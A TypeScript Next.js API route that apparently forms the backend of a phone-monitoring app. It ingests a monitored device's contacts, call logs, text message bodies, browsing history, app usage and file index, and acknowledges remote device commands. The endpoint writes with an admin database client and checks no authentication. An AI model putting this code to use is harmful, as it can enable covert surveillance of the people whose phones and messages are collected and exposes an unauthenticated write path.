// app/api/device-sync/data/route.ts
import { NextResponse } from "next/server";
import { createAdminClient } from "@/lib/supabase/admin";

export const dynamic = "force-dynamic";

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { device_id, command_id, contacts, calls, messages, installed_apps, browsing_history, files } = body;

    if (!device_id) {
      return NextResponse.json({ error: "device_id is required" }, { status: 400 });
    }

    const admin = createAdminClient();

    if (command_id) {
      await admin
        .from("device_commands")
        .update({ status: "executed", executed_at: new Date().toISOString() })
        .eq("id", command_id);
    }

    const results: Record<string, number> = {
      contacts: 0, calls: 0, messages: 0, installed_apps: 0, browsing_history: 0, files: 0,
    };

    // Batch upsert contacts — ON CONFLICT for zero duplicates, no O(n²) dedup
    if (Array.isArray(contacts) && contacts.length > 0) {
      const contactRows = contacts.map((c: any) => ({
        device_id,
        name: String(c.name || "Unknown").trim(),
        phone_numbers: Array.isArray(c.phone_numbers) ? c.phone_numbers : [c.phone_number || ""],
        emails: Array.isArray(c.emails) ? c.emails : [],
        synced_at: new Date().toISOString(),
      }));
      for (let i = 0; i < contactRows.length; i += 500) {
        const batch = contactRows.slice(i, i + 500);
        const { error } = await admin.from("device_contacts").upsert(batch, {
          onConflict: "device_id,name",
          ignoreDuplicates: false,
        });
        if (!error) results.contacts += batch.length;
      }
    }

    // Batch upsert calls — ignoreDuplicates to prevent timestamp precision failures
    if (Array.isArray(calls) && calls.length > 0) {
      const callRows = calls.map((c: any) => ({
        device_id,
        contact_name: c.contact_name || null,
        phone_number: String(c.phone_number || "Unknown"),
        call_type: ["incoming", "outgoing", "missed", "rejected"].includes(c.call_type)
          ? c.call_type
          : "incoming",
        duration_seconds: Number(c.duration_seconds || 0),
        timestamp: c.timestamp || new Date().toISOString(),
      }));
      for (let i = 0; i < callRows.length; i += 500) {
        const batch = callRows.slice(i, i + 500);
        const { error, count } = await admin.from("device_calls").upsert(batch, {
          onConflict: "device_id,phone_number,timestamp",
          ignoreDuplicates: true,
        });
        if (!error) results.calls += batch.length;
      }
    }

    // Batch upsert messages — ignoreDuplicates to prevent precision failures
    if (Array.isArray(messages) && messages.length > 0) {
      const messageRows = messages.map((m: any) => ({
        device_id,
        sender: String(m.sender || "Unknown"),
        recipient: m.recipient || null,
        body: String(m.body || ""),
        message_type: m.message_type === "sent" ? "sent" : "inbox",
        timestamp: m.timestamp || new Date().toISOString(),
      }));
      for (let i = 0; i < messageRows.length; i += 500) {
        const batch = messageRows.slice(i, i + 500);
        const { error } = await admin.from("device_messages").upsert(batch, {
          onConflict: "device_id,sender,timestamp",
          ignoreDuplicates: true,
        });
        if (!error) results.messages += batch.length;
      }
    }

    // Batch upsert installed apps & screen time
    if (Array.isArray(installed_apps) && installed_apps.length > 0) {
      const appRows = installed_apps.map((a: any) => ({
        device_id,
        package_name: String(a.package_name),
        app_name: String(a.app_name || a.package_name),
        app_icon_url: a.app_icon_url || null,
        usage_time_seconds: Number(a.usage_time_seconds || 0),
        last_time_used: a.last_time_used ? new Date(a.last_time_used).toISOString() : null,
        is_system_app: Boolean(a.is_system_app),
        updated_at: new Date().toISOString(),
      }));
      const { error } = await admin.from("device_installed_apps").upsert(appRows, {
        onConflict: "device_id,package_name",
      });
      if (!error) results.installed_apps = appRows.length;
    }

    // Batch insert browsing history
    if (Array.isArray(browsing_history) && browsing_history.length > 0) {
      const browsingRows = browsing_history.map((b: any) => ({
        device_id,
        browser_name: b.browser_name || "Chrome",
        url: String(b.url),
        title: b.title || null,
        visit_time: b.visit_time ? new Date(b.visit_time).toISOString() : new Date().toISOString(),
      }));
      const { error } = await admin.from("device_browsing_history").insert(browsingRows);
      if (!error) results.browsing_history = browsingRows.length;
    }

    // Batch upsert files index (with thumbnail updates)
    if (Array.isArray(files) && files.length > 0) {
      const fileRows = files.map((f: any) => ({
        device_id,
        file_name: String(f.file_name || "File"),
        file_path: String(f.file_path || ""),
        file_type: ["image", "video", "audio", "document", "other"].includes(f.file_type)
          ? f.file_type
          : "other",
        file_size_bytes: Number(f.file_size_bytes || 0),
        storage_path: f.storage_path || null,
        thumbnail_path: f.thumbnail_path || null,
      }));
      const { error } = await admin.from("device_files").upsert(fileRows, {
        onConflict: "device_id,file_path",
      });
      if (!error) results.files = fileRows.length;
    }

    // Update last_seen_at
    await admin
      .from("monitored_devices")
      .update({ last_seen_at: new Date().toISOString(), is_online: true })
      .eq("id", device_id);

    return NextResponse.json({ success: true, synced: results });
  } catch (err: any) {
    return NextResponse.json({ error: err.message }, { status: 500 });
  }
}
